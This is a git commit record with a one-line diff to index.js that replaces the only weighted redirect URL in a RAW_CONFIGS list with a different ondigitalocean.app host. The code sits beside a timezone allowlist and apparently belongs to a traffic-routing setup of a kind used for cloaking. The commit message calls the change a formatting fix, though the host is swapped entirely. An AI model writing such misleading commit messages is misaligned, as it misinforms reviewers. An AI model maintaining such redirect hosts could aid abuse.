7a493e6b3b1b4c86804ecde461d973757b7f0e60
paalakash <palaksh452@gmail.com>
2026-07-14 14:39:22 +0530

    Refactor RAW_CONFIGS for URL and weight consistency
    Corrected URL formatting and ensured weight consistency in RAW_CONFIGS.

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://on-app-2sgxs.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://lionfish-app-d9bnq.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
